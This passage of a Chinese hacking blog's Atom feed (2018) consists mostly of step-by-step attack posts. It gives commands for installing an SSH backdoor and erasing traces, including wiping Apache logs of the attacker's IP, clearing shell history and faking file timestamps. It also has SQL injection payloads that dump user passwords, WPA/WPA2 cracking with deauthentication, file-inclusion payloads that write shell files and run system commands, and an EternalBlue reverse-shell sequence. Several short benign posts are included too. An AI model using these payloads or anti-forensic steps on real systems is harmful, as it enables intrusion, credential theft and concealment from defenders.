id="安装并重启SSH"><a href="#安装并重启SSH" class="headerlink" title="安装并重启SSH"></a>安装并重启SSH</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; make install</span><br><span class="line">service sshd restart</span><br></pre></td></tr></table></figure><h3 id="简单处理记录"><a href="#简单处理记录" class="headerlink" title="简单处理记录"></a>简单处理记录</h3><h4 id="还原新配置文件为旧配置文件时间"><a href="#还原新配置文件为旧配置文件时间" class="headerlink" title="还原新配置文件为旧配置文件时间"></a>还原新配置文件为旧配置文件时间</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch -r/etc/ssh/ssh_config.old /etc/ssh/ssh_config</span><br><span class="line">touch -r/etc/ssh/sshd_config.old /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p>将ssh_config和sshd_config修改时间跟ssh_config.old和sshd_config.old一致，减少被发现的概率。</p><h4 id="清除apache日志"><a href="#清除apache日志" class="headerlink" title="清除apache日志"></a>清除apache日志</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">export HISTFILE=/dev/null </span><br><span class="line">export HISTSIZE=0 </span><br><span class="line">cd /etc/httpd/logs/ </span><br><span class="line">sed -i ‘/192.168.52.175/d’ access_log* </span><br><span class="line">echo &gt;/root/.bash_history //清空操作日志</span><br></pre></td></tr></table></figure><h4 id="清除用户目录下的-bash-history文件"><a href="#清除用户目录下的-bash-history文件" class="headerlink" title="清除用户目录下的.bash_history文件"></a>清除用户目录下的.bash_history文件</h4><pre><code>vi .bash_history</code></pre><p>然后全部删除保存。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;#SSH后门复现&lt;/p&gt;
+&lt;h3 id=&quot;最开始先查看自己的ssh版本&quot;&gt;&lt;a href=&quot;#最开始先查看自己的ssh版本&quot; class=&quot;headerlink&quot; title=&quot;最开始先查看自己的ssh版本&quot;&gt;&lt;/a&gt;最开始先查看自己的ssh版本&lt;/h3&gt;&lt;pre&gt;&lt;cod
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>sql手注步骤（非盲注）</title>
+    <link href="http://yoursite.com/2018/05/05/sql%E6%89%8B%E6%B3%A8%E6%AD%A5%E9%AA%A4/"/>
+    <id>http://yoursite.com/2018/05/05/sql手注步骤/</id>
+    <published>2018-05-05T03:52:16.000Z</published>
+    <updated>2018-05-09T09:47:23.424Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="手注步骤"><a href="#手注步骤" class="headerlink" title="手注步骤"></a>手注步骤</h1><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p><strong>1.判断是否存在注入，注入是字符型还是数字型</strong></p><p><strong>2.猜解SQL查询语句中的字段数</strong></p><p><strong>3.确定显示的字段顺序</strong></p><p><strong>4.获取当前数据库</strong></p><p><strong>5.获取数据库中的表</strong></p><p><strong>6.获取表中的字段名</strong></p><p><strong>7.下载数据</strong></p><h2 id="1-判断是否存在注入，注入是字符型还是数字型"><a href="#1-判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="1.判断是否存在注入，注入是字符型还是数字型"></a>1.判断是否存在注入，注入是字符型还是数字型</h2><p>判断注入类型：<strong>数字型，字符型</strong></p><h2 id="2-猜解SQL查询语句中的字段数"><a href="#2-猜解SQL查询语句中的字段数" class="headerlink" title="2.猜解SQL查询语句中的字段数"></a>2.猜解SQL查询语句中的字段数</h2><p>判断字段数：</p><pre><code>1′ or 1=1 order by 1,2,3,4,5 #</code></pre><p>数字累加，直到不出结果或者报错。</p><hr><p><strong>注释常常使用<code>--+</code>或者<code>#</code>或者<code>%23</code></strong></p><hr><p>或者用：</p><pre><code>-1′ union select 1,2 #</code></pre><hr><p><strong>两个sql语句进行联合操作时，当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来</strong></p><hr><p>顺路进行下一步</p><h2 id="3-确定显示的字段顺序"><a href="#3-确定显示的字段顺序" class="headerlink" title="3.确定显示的字段顺序"></a>3.确定显示的字段顺序</h2><pre><code>-1′ union select 1,2 #</code></pre><h2 id="4-获取当前数据库"><a href="#4-获取当前数据库" class="headerlink" title="4.获取当前数据库"></a>4.获取当前数据库</h2><pre><code>-1′ union select 1,database() #</code></pre><h2 id="5-获取数据库中的表"><a href="#5-获取数据库中的表" class="headerlink" title="5.获取数据库中的表"></a>5.获取数据库中的表</h2><pre><code>-1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code></pre><p>从information_schema中查找表名</p><hr><p><strong>进行联合查询时要将查询用的语句放在最后一项</strong></p><hr><h2 id="6-获取表中的字段名"><a href="#6-获取表中的字段名" class="headerlink" title="6.获取表中的字段名"></a>6.获取表中的字段名</h2><pre><code>-1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #</code></pre><p>爆users表内的表名</p><h2 id="7-下载数据"><a href="#7-下载数据" class="headerlink" title="7.下载数据"></a>7.下载数据</h2><pre><code>-1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</code></pre><p>从users里面取出所有用户的user_id,first_name,last_name,password的数据</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;手注步骤&quot;&gt;&lt;a href=&quot;#手注步骤&quot; class=&quot;headerlink&quot; title=&quot;手注步骤&quot;&gt;&lt;/a&gt;手注步骤&lt;/h1&gt;&lt;h2 id=&quot;目录&quot;&gt;&lt;a href=&quot;#目录&quot; class=&quot;headerlink&quot; title=&quot;目录&quot;&gt;&lt;/a&gt;目录&lt;/h
+      
+    
+    </summary>
+    
+      <category term="sql" scheme="http://yoursite.com/categories/sql/"/>
+    
+    
+      <category term="sql" scheme="http://yoursite.com/tags/sql/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>利用kali破解wpa/wpa2加密的WIFI（爆破美学）</title>
+    <link href="http://yoursite.com/2018/05/01/%E5%88%A9%E7%94%A8kali%E7%A0%B4%E8%A7%A3wpa-wpa2%E5%8A%A0%E5%AF%86%E7%9A%84WIFI%EF%BC%88%E7%88%86%E7%A0%B4%E7%BE%8E%E5%AD%A6%EF%BC%89/"/>
+    <id>http://yoursite.com/2018/05/01/利用kali破解wpa-wpa2加密的WIFI（爆破美学）/</id>
+    <published>2018-05-01T14:26:38.000Z</published>
+    <updated>2018-05-01T14:42:20.385Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="利用kali破解wpa-wpa2加密的WIFI（爆破美学）"><a href="#利用kali破解wpa-wpa2加密的WIFI（爆破美学）" class="headerlink" title="利用kali破解wpa/wpa2加密的WIFI（爆破美学）"></a>利用kali破解wpa/wpa2加密的WIFI（爆破美学）</h1><h2 id="硬件准备阶段："><a href="#硬件准备阶段：" class="headerlink" title="硬件准备阶段："></a>硬件准备阶段：</h2><p>因为用vm安装的kali不支持笔记本内置的无限网卡所以需要购买kali支持的网卡，博主买的是<strong>RT3070L芯片组</strong>的网卡，某宝上面无壳的只要20元，加壳才25元。<br>在kali中必须识别出网卡，使用<strong>ifconfig</strong>查看网卡信息，wlan0为无线网卡。<img src="https://s1.ax1x.com/2018/05/01/CJh0tx.jpg" alt="CJh0tx.jpg"></p><h2 id="攻击准备阶段："><a href="#攻击准备阶段：" class="headerlink" title="攻击准备阶段："></a>攻击准备阶段：</h2><h3 id="开启网卡监听模式："><a href="#开启网卡监听模式：" class="headerlink" title="开启网卡监听模式："></a>开启网卡监听模式：</h3><pre><code>airmon-ng start wlan0</code></pre><p>如果成功的话，网卡名称会变成wlan0mon<br><img src="https://s1.ax1x.com/2018/05/01/CJhwA1.jpg" alt="CJhwA1.jpg"></p><h3 id="扫描热点："><a href="#扫描热点：" class="headerlink" title="扫描热点："></a>扫描热点：</h3><pre><code>airodump-ng wlan0mon</code></pre><p>可以看到如图信息[<img src="https://s1.ax1x.com/2018/05/01/CJha7R.md.jpg" alt="CJha7R.md.jpg"></p><h3 id="抓握手包："><a href="#抓握手包：" class="headerlink" title="抓握手包："></a>抓握手包：</h3><p>c代表信道，bssid为mac地址，w参数指的是抓到的包放的目录以及包的名字。</p><pre><code>airodump-ng wlan0mon -c 4 --bssid XX:XX:XX:XX -w /root-c 选择信道，对应上图CH--bssid 需要破解的wifi的mac地址-w cap文件名及路径wlan0mon 启用监听模式的网卡名</code></pre><p>当有人连接时就能抓到握手包。<img src="https://s1.ax1x.com/2018/05/01/CJhUB9.jpg" alt="CJhUB9.jpg"></p><h4 id="如果对面都在使用wifi，没人连接怎么办？"><a href="#如果对面都在使用wifi，没人连接怎么办？" class="headerlink" title="如果对面都在使用wifi，没人连接怎么办？"></a>如果对面都在使用wifi，没人连接怎么办？</h4><p>通过以下命令断开设备与WiFi的连接</p><pre><code>aireplay-ng -0 20 -a A8:6B:7C:19:9F:D0 -c 4C:49:E3:D8:FD:7F wlan0mon-0 death（强制下线模式），20为执行次数-c 被断网的客户机MAC-a WIFI热点的mac</code></pre><p>抓包成功后白圈出现信息。<br><img src="https://s1.ax1x.com/2018/05/01/CJhUB9.jpg" alt="CJhUB9.jpg"></p><h3 id="爆破："><a href="#爆破：" class="headerlink" title="爆破："></a>爆破：</h3><h4 id="kali："><a href="#kali：" class="headerlink" title="kali："></a>kali：</h4><p>利用aircrack-ng命令</p><pre><code>aircrack-ng -w 字典 握手包</code></pre><p>cpu跑这个破解速度有些慢。</p><h4 id="windows："><a href="#windows：" class="headerlink" title="windows："></a>windows：</h4><h5 id="神器1："><a href="#神器1：" class="headerlink" title="神器1："></a>神器1：</h5><p>EWSA，然而7.x版本虽然支持gpu加速，然而没有破解版软件，只能查看密码前两位，收费299$(贵死人)</p><h5 id="神器2："><a href="#神器2：" class="headerlink" title="神器2："></a>神器2：</h5><p>oclHashcat，使用方法有些复杂，是一个win下面的使用命令行的工具，破解速度十分可观。<br>有国人开发了中文版的UI，减少了使用成本，链接：<a href="https://www.iteknical.com/hashcat-gui-cn/" target="_blank" rel="noopener">HashcatGUI_cn – HashcatGUI 中文版</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;利用kali破解wpa-wpa2加密的WIFI（爆破美学）&quot;&gt;&lt;a href=&quot;#利用kali破解wpa-wpa2加密的WIFI（爆破美学）&quot; class=&quot;headerlink&quot; title=&quot;利用kali破解wpa/wpa2加密的WIFI（爆破美学）&quot;&gt;&lt;/a
+      
+    
+    </summary>
+    
+      <category term="kali" scheme="http://yoursite.com/categories/kali/"/>
+    
+    
+      <category term="kali" scheme="http://yoursite.com/tags/kali/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>文件包含漏洞常用命令</title>
+    <link href="http://yoursite.com/2018/04/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
+    <id>http://yoursite.com/2018/04/09/文件包含漏洞常用命令/</id>
+    <published>2018-04-09T08:56:35.000Z</published>
+    <updated>2018-11-07T12:35:57.902Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="主要包含形式"><a href="#主要包含形式" class="headerlink" title="主要包含形式"></a>主要包含形式</h1><h2 id="1-包含本地文件"><a href="#1-包含本地文件" class="headerlink" title="1.包含本地文件"></a>1.包含本地文件</h2><p>payload：</p><pre><code>?page=C:\oneword?file=C:\boot.ini（Windows查看系统版本）?file=C:\WindowsSystem32inetsrvMetaBase.xml（Windows查看IIS配置文件)</code></pre><h2 id="2-包含远程文件"><a href="#2-包含远程文件" class="headerlink" title="2.包含远程文件"></a>2.包含远程文件</h2><p>payload：</p><pre><code>?url=http://www.bbb.com/2.txt?url=[http|https|ftp]://www.bbb.com/2.txt（可以有三种，http、https、ftp）</code></pre><h2 id="3-伪协议"><a href="#3-伪协议" class="headerlink" title="3.伪协议"></a>3.伪协议</h2><p>1) php://input</p><p>说明：</p><p>用来接收POST数据。我们能够通过input把我们的语句输入上去然后执行。</p><p>条件：</p><p>php &lt;5.0 ，allow_url_include=Off 情况下也可以用</p><p>php &gt; 5.0，只有在allow_url_fopen=On 时才能使用</p><p>用例1 增加一句话：</p><p>URL：</p><pre><code>http://localhost/include/file.php?file=php://input</code></pre><p>POST：</p><pre><code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;a&quot;),&quot;&lt;?php phpinfo();?&gt;&quot;) ?&gt;</code></pre><p>用例2 增加文件：</p><p>URL：<br><code>http://localhost/include/file.php?file=php://input</code><br>POST：<br><code>&lt;?php fputs(fopen(&quot;oneword.php&quot;,&quot;w&quot;),&quot;&lt;?php phpinfo();?&gt;&quot;) ?&gt;</code><br>这里fopen参数为w，可新建一个文件。</p><p>用例3 执行系统命令：</p><p>URL：<br><code>http://localhost/include/file.php?file=php://input</code><br>POST：<br><code>&lt;?php system(&#39;ipconfig&#39;);?&gt;</code></p><hr><p>2)data://</p><p>说明：</p><p>这是一种数据流封装器，data:URI schema(URL schema可以是很多形式)</p><p>利用data://伪协议进行代码执行的思路原理和php://是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中</p><p>条件：</p><p>allow_url_include=On<br>php &gt; 5.2</p><hr><p>3)<strong>php://filter</strong></p><p>说明：</p><p>这个语句用来查看源码。直接包含php文件时会被解析，不能看到源码，所以用filter来读取，不过要先base64加密传输过来：</p><pre><code>?page=php://filter/read=convert.base64-encode/resource=php.ini</code></pre><p>访问上述URL后会返回config.php中经过Base64加密后的字符串，解密即可得到源码</p><p><strong>payload:</strong></p><pre><code>http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=file.php</code></pre><p>资料来源：<br><a href="https://www.anquanke.com/post/id/86123" title="参考网站" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86123</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;主要包含形式&quot;&gt;&lt;a href=&quot;#主要包含形式&quot; class=&quot;headerlink&quot; title=&quot;主要包含形式&quot;&gt;&lt;/a&gt;主要包含形式&lt;/h1&gt;&lt;h2 id=&quot;1-包含本地文件&quot;&gt;&lt;a href=&quot;#1-包含本地文件&quot; class=&quot;headerlink&quot; 
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>打造手机渗透神器kali-linux-nethunter安装</title>
+    <link href="http://yoursite.com/2018/03/10/%E6%89%93%E9%80%A0%E6%89%8B%E6%9C%BA%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8kali-linux-nethunter%E5%AE%89%E8%A3%85/"/>
+    <id>http://yoursite.com/2018/03/10/打造手机渗透神器kali-linux-nethunter安装/</id>
+    <published>2018-03-10T04:59:57.000Z</published>
+    <updated>2018-03-10T06:34:32.330Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="一加1（bacon）-Kali-Nethunter安装指南"><a href="#一加1（bacon）-Kali-Nethunter安装指南" class="headerlink" title="一加1（bacon） Kali Nethunter安装指南"></a>一加1（bacon） Kali Nethunter安装指南</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol><li><h3 id="准备一加一手机"><a href="#准备一加一手机" class="headerlink" title="准备一加一手机"></a>准备一加一手机</h3><ul><li>解锁并刷到CM12并且开过一次机（我用魔趣也能成功，理论上来说任意6.0都行）</li><li>刷好TWRP recovery</li></ul></li><li><h3 id="官网下载刷机包"><a href="#官网下载刷机包" class="headerlink" title="官网下载刷机包"></a>官网下载刷机包</h3><hr><h4 id="夜版（nightly）"><a href="#夜版（nightly）" class="headerlink" title="夜版（nightly）"></a>夜版（nightly）</h4><p> 刷机包本体：<br> <a href="https://build.nethunter.com/nightly/2017.11-18-1618/nethunter-generic-armhf-kalifs-full-rolling-2017.11-18-1618.zip" title="ARM框架用" target="_blank" rel="noopener">https://build.nethunter.com/nightly/2017.11-18-1618/nethunter-generic-armhf-kalifs-full-rolling-2017.11-18-1618.zip</a></p><p> 内核：<br> 6.0 <a href="https://build.nethunter.com/nightly/2017.11-18-1618/kernel-nethunter-oneplus1-marshmallow-2017.11-18-1618.zip" title="安卓6.0" target="_blank" rel="noopener">https://build.nethunter.com/nightly/2017.11-18-1618/kernel-nethunter-oneplus1-marshmallow-2017.11-18-1618.zip</a></p><hr><h4 id="正式版（强烈推荐）"><a href="#正式版（强烈推荐）" class="headerlink" title="正式版（强烈推荐）"></a>正式版（强烈推荐）</h4><p> 刷机包本体：<br> <a href="https://build.nethunter.com/release/marshmallow/nethunter-oneplus1-marshmallow-kalifs-full-3.20-20170717-1810.zip" title="适用于一加1的正式版" target="_blank" rel="noopener">https://build.nethunter.com/release/marshmallow/nethunter-oneplus1-marshmallow-kalifs-full-3.20-20170717-1810.zip</a></p><hr></li><li><h3 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h3><ul><li>千万别双清，千万别双清，千万别双清（如果date被清了会刷写失败）</li><li>卡刷刷机包本体（正式版）</li><li>（如果是夜版先刷内核再刷刷机包本体）</li></ul></li></ol>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;一加1（bacon）-Kali-Nethunter安装指南&quot;&gt;&lt;a href=&quot;#一加1（bacon）-Kali-Nethunter安装指南&quot; class=&quot;headerlink&quot; title=&quot;一加1（bacon） Kali Nethunter安装指南&quot;&gt;&lt;/a
+      
+    
+    </summary>
+    
+      <category term="kali" scheme="http://yoursite.com/categories/kali/"/>
+    
+    
+      <category term="kali" scheme="http://yoursite.com/tags/kali/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>记一次解决某网站高速下载病毒</title>
+    <link href="http://yoursite.com/2018/02/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%A7%A3%E5%86%B3%E6%9F%90%E7%BD%91%E7%AB%99%E9%AB%98%E9%80%9F%E4%B8%8B%E8%BD%BD%E7%97%85%E6%AF%92/"/>
+    <id>http://yoursite.com/2018/02/11/记一次解决某网站高速下载病毒/</id>
+    <published>2018-02-11T03:19:04.000Z</published>
+    <updated>2018-02-11T03:23:33.162Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="怒草流氓软件"><a href="#怒草流氓软件" class="headerlink" title="怒草流氓软件"></a>怒草流氓软件</h1><p>在某网站上下载软件，不小心用了高速下载，然后就被安装了流氓软件。<br>天天开机弹广告，还不是启动项，通过进程删掉流氓软件后每次开机出现explorer.exe警告，在网上搜索后找到解决方案。 </p><p>在注册表<strong>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</strong>里能找到和流氓软件对应地址的一个注册表项，删除此项，重启，问题解决。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;怒草流氓软件&quot;&gt;&lt;a href=&quot;#怒草流氓软件&quot; class=&quot;headerlink&quot; title=&quot;怒草流氓软件&quot;&gt;&lt;/a&gt;怒草流氓软件&lt;/h1&gt;&lt;p&gt;在某网站上下载软件，不小心用了高速下载，然后就被安装了流氓软件。&lt;br&gt;天天开机弹广告，还不是启动项，通过进
+      
+    
+    </summary>
+    
+    
+      <category term="病毒" scheme="http://yoursite.com/tags/%E7%97%85%E6%AF%92/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>kali更新源问题解决方案</title>
+    <link href="http://yoursite.com/2018/02/06/kali%E6%9B%B4%E6%96%B0%E6%BA%90%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
+    <id>http://yoursite.com/2018/02/06/kali更新源问题解决方案/</id>
+    <published>2018-02-06T04:17:06.000Z</published>
+    <updated>2018-05-06T03:55:09.758Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="更换apt源后显示GPG错误-签名无效等"><a href="#更换apt源后显示GPG错误-签名无效等" class="headerlink" title="更换apt源后显示GPG错误 签名无效等"></a>更换apt源后显示GPG错误 签名无效等</h3><h5 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h5><p>Kali Linux由于太长时间未更新，而出现GPG错误 KEYEXPIRED 1425567400。经检查源未出现问题可以解析，deb也不冲突，就是密钥过期了!<img src="https://s1.ax2x.com/2018/02/06/vQvfJ.png" alt=""></p><h5 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h5><p>具体更新方法有以下几种方法：（任选一种即可）</p><pre><code>1、# apt-key adv --keyserver keys.gnupg.net --recv-keys ED444FF07D8D0BF6</code></pre><hr><pre><code>2、# wget -q -O - archive.kali.org/archive-key.asc | apt-key add</code></pre><hr><pre><code>3、# gpg --keyserver hkp://pgpkeys.mit.edu --recv-key ED444FF07D8D0BF6# gpg -a --export ED444FF07D8D0BF6 | sudo apt-key add -</code></pre><hr><pre><code>4、# wget https://http.kali.org/kali/pool/ ... ring_2018.1_all.deb# apt install ./kali-archive-keyring_2018.1_all.deb</code></pre><p>成功更新密钥之后，我们就可以正常的 update / upgrade 了。</p><p>然后在执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure></p><p>即可。<br><img src="https://s1.ax2x.com/2018/02/06/vQhal.png" alt="解决"></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;更换apt源后显示GPG错误-签名无效等&quot;&gt;&lt;a href=&quot;#更换apt源后显示GPG错误-签名无效等&quot; class=&quot;headerlink&quot; title=&quot;更换apt源后显示GPG错误 签名无效等&quot;&gt;&lt;/a&gt;更换apt源后显示GPG错误 签名无效等&lt;/h3&gt;&lt;
+      
+    
+    </summary>
+    
+      <category term="kali" scheme="http://yoursite.com/categories/kali/"/>
+    
+    
+      <category term="kali" scheme="http://yoursite.com/tags/kali/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>瞎搞的一次ms17-0100漏洞利用</title>
+    <link href="http://yoursite.com/2018/01/18/%E7%9E%8E%E6%90%9E%E7%9A%84%E4%B8%80%E6%AC%A1ms17-0100%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
+    <id>http://yoursite.com/2018/01/18/瞎搞的一次ms17-0100漏洞利用/</id>
+    <published>2018-01-18T02:22:42.000Z</published>
+    <updated>2018-01-18T02:45:04.326Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><h2 id="前提条件："><a href="#前提条件：" class="headerlink" title="前提条件："></a>前提条件：</h2><p><strong>gem install ruby_smb</strong><br>—-ruby_smb模块安装<br><strong>msfupdate</strong><br>—-msf的更新<br><strong>msfconsole -qx “use<br>exploit/windows/smb/ms17_010_eternalblue”</strong><br>—-启动并加载模块</p><hr><h2 id="部署环境："><a href="#部署环境：" class="headerlink" title="部署环境："></a>部署环境：</h2><ul><li><strong>msfconsole</strong>  </li><li><strong>wget <a href="https://raw.githubusercontent.com/backlion/metasploit-framework/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb" target="_blank" rel="noopener">https://raw.githubusercontent.com/backlion/metasploit-framework/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb</a></strong>  </li><li><strong>cp ms17_010_eternalblue.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue.rb</strong>  </li></ul><hr><h2 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击:"></a>开始攻击:</h2><ul><li><strong>msfconsole</strong></li><li><strong>use exploit/windows/smb/ms17_010_eternalblue</strong> </li><li><strong>set rhost 192.168.21.128</strong></li><li><strong>set lhost 192.168.21.131</strong></li><li><strong>set payload windows/x64/meterpreter/reverse_tcp</strong></li><li><strong>exploit</strong>  </li><li><strong>shell</strong></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;MS17-010&quot;&gt;&lt;a href=&quot;#MS17-010&quot; class=&quot;headerlink&quot; title=&quot;MS17-010&quot;&gt;&lt;/a&gt;MS17-010&lt;/h1&gt;&lt;h2 id=&quot;前提条件：&quot;&gt;&lt;a href=&quot;#前提条件：&quot; class=&quot;headerlink
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>搭建个人博客</title>
+    <link href="http://yoursite.com/2018/01/16/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
+    <id>http://yoursite.com/2018/01/16/搭建个人博客/</id>
+    <published>2018-01-16T05:21:52.000Z</published>
+    <updated>2018-01-18T02:19:44.453Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="第一次尝试"><a href="#第一次尝试" class="headerlink" title="第一次尝试"></a>第一次尝试</h1><p>2018/1/16<br>经过两天的尝试，终于成功地在Github上面搭建了博客。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;第一次尝试&quot;&gt;&lt;a href=&quot;#第一次尝试&quot; class=&quot;headerlink&quot; title=&quot;第一次尝试&quot;&gt;&lt;/a&gt;第一次尝试&lt;/h1&gt;&lt;p&gt;2018/1/16&lt;br&gt;经过两天的尝试，终于成功地在Github上面搭建了博客。&lt;/p&gt;
+
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Hello World</title>
+    <link href="http://yoursite.com/2018/01/15/hello-world/"/>
+    <id>http://yoursite.com/2018/01/15/hello-world/</id>
+    <published>2018-01-15T14:52:42.245Z</published>
+    <updated>2018-01-15T14:52:42.245Z</updated>
+    
+    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+</feed>
